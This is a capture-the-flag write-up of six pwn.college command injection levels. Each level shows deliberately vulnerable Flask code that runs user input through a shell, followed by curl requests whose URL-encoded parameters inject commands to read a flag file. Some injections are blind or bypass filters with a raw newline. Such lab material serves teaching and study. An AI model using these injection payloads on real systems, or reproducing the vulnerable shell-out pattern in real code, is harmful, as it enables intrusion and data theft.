---
tags: ["Web Security", "Linux Shell"]
title: "CMDI- Command Injection"
description: CMDI - Command Injection
reference: https://pwn.college/intro-to-cybersecurity/web-security/
---

# 1

## Description

Now, imagine getting more crazy than these security issues between the web server and the file system. What about interactions between the web server and the whole Linux shell?

Depressingly often, developers rely on the command line shell to help with complex operations. In these cases, a web server will execute a Linux command and use the command's results in its operation (a frequent usecase of this, for example, is the Imagemagick suite of commands that facilitate image processing). Different languages have different ways to do this (the simplest way in Python is os.system, but we will mostly be interacting with the more advanced subprocess.check_output), but almost all suffer from the risk of command injection.

In path traversal, the attacker sent an unexpected character (.) that caused the filesystem to do something unexpected to the developer (look in the parent directory). The shell, similarly, is chock full of special characters that cause effects unintended by the developer, and the gap between what the developer intended and the reality of what the shell (or, in previous challenges, the file system) does holds all sorts of security issues.

For example, consider the following Python snippet that runs a shell command:

os.system(f"echo Hello {word}")
The developer clearly intends the user to send something like Hackers, and the result to be something like the command echo Hello Hackers. But the hacker might send anything the code doesn't explicitly block. Recall what you learned in the Chaining module of the Linux Luminarium: what if the hacker sends something containing a ;?

In this level, we will explore this exact concept. See if you can trick the level and leak the flag!

## Solution

1. how the server execute the command

```python
@app.route("/problem", methods=["GET"])
def challenge():
    arg = flask.request.args.get("location", "/challenge")
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/problem"><input type=text name=location><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """
```

2. noted the the user of the process is root

so the server has enough permission to read the flag

```
root         156  0.0  0.0 105512 26880 pts/0    S    16:48   0:00 /usr/bin/python -I -- /challenge/server
```

3. craft the http request that the server will also execute the command of `cat /flag`

```bash
curl challenge.localhost/problem?location=%7E%3Bcat+%2Ffla
```

http url encoding tool: https://www.url-encode-decode.com/

---

# 2

## Description

Many developers are aware of things like command injection, and try to prevent it. In this level, you may not use ;! Can you think of another way to command-inject? Recall what you learned in the Piping module of the Linux Luminarium...

## Solution

1. related server code

```
@app.route("/event", methods=["GET"])
def challenge():
    arg = flask.request.args.get("subdirectory", "/challenge").replace(";", "")
    command = f"ls -l {arg}"
```

2. let the server will `cat /flag` using pipe `|`

arg:

```
~ | cat /flag
```

http request: 

```
curl challenge.localhost/event?subdirectory=%7E+%7C+cat+%2Fflag
```

---

# 3

## Description

An interesting thing about command injection is that you don't get to choose where in the command the injection occurs: the developer accidentally makes that choice for you when writing the program. Sometimes, these injections occur in uncomfortable places. Consider the following:

os.system(f"echo Hello '{word}'")
Here, the developer tried to convey to the shell that word should really be only one word. The shell, when given arguments in single quotes, treats otherwise-special characters like ;, $, and so on as just normal characters, until it hits the closing single quote (').

This level gives you this scenario. Can you bypass it?

HINT: Keep in mind that there will be a ' character right at the end of whatever you inject. In the shell, all quotes must be matched with a partner, or the command is invalid. Make sure to craft your injection so that the resulting command is valid!

## Solution

1. see how the server process the argument

```
@app.route("/problem", methods=["GET"])
def challenge():
    arg = flask.request.args.get("topdir", "/challenge")
    command = f"ls -l '{arg}'"
```

2. craft url where `topdir=/'; cat /flag'`

So that the server will do - `command = f"ls -l '/'; cat /flag''" = command = f"ls -l /; cat /flag` 

```
curl challenge.localhost/problem?topdir=%2F%27%3B+cat+%2Fflag%27
```

---

# 4

## Description

Calling shell commands to carry out work, or "shelling out" as it is often termed, is dangerous. Any part of a shell command is potentially injectible! In this level, we'll practice injecting into a slightly different part of a slightly different command.

## Solution

1. see how the server process the argument

```python
@app.route("/milestone", methods=["GET"])
def challenge():
    arg = flask.request.args.get("tzone", "MST")
    command = f"TZ={arg} date"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout
```

2. craft url that break the command to 3 commands

So that the server will do - `command = TZ=1; cat /flag; date` 

```
curl challenge.localhost/milestone?tzone=1%3B+cat+%2Fflag%3B
```
---

# 5

## Description

Programs tend to shell out to do complex internal computation. This means that you might not always get sent the resulting output, and you will need to do your attack blind. Try it in this level: without the output of your injected command, get the flag!

## Solution

1. 

```python
@app.route("/adventure", methods=["GET"])
def challenge():
    arg = flask.request.args.get("target-file", "/challenge/PWN")
    command = f"touch {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the touch service! Please choose a file to touch:
        <form action="/adventure"><input type=text name=target-file><input type=submit value=Submit></form>
        <hr>
        <b>Ran {command}!</b><br>
        </body></html>
        """
```

2. touch a file in hacker home directory which owned by hacker

```
hacker@web-security~cmdi-5:/challenge$ ls -alt ~/f
-rw-r--r-- 1 hacker hacker 60 Jul 21 17:48 /home/hacker/f
```

3. craft the url that set `target-file=1; cat /flag > /home/hacker/f`

we want the server write the `/flag` content into `~/f`

```
curl challenge.localhost/adventure?target-file=1%3B+cat+%2Fflag+%3E+%2Fhome%2Fhacker%2Ff
```

---

# 6

## Description

Sometimes, developers try very hard to filter out potentially dangerous characters. The success in this challenge is almost perfect, but not quite... You'll be stumped for a while, but will laugh at its familiarity when you figure out the solution!

## Solution

1. check the server code

```python
@app.route("/trial", methods=["GET"])
def challenge():
    arg = (
        flask.request.args.get("subdirectory", "/challenge")
        .replace(";", "")
        .replace("&", "")
        .replace("|", "")
        .replace(">", "")
        .replace("<", "")
        .replace("(", "")
        .replace(")", "")
        .replace("`", "")
        .replace("$", "")
    )
    command = f"ls -l {arg}"

    print(f"DEBUG: {command=}")
    result = subprocess.run(
        command,  # the command to run
        shell=True,  # use the shell to run this command
        stdout=subprocess.PIPE,  # capture the standard output
        stderr=subprocess.STDOUT,  # 2>&1
        encoding="latin",  # capture the resulting output as text
    ).stdout

    return f"""
        <html><body>
        Welcome to the dirlister service! Please choose a directory to list the files of:
        <form action="/trial"><input type=text name=subdirectory><input type=submit value=Submit></form>
        <hr>
        <b>Output of {command}:</b><br>
        <pre>{result}</pre>
        </body></html>
        """
```

2. how the shell handle raw newline

it sperates commands per newline:

> Type Ctrl-v -> Ctrl-j to add a raw newline into the shell prompt

```
hacker@web-security~cmdi-6:/challenge$ echo Hello
whoami
Hello
hacker
```


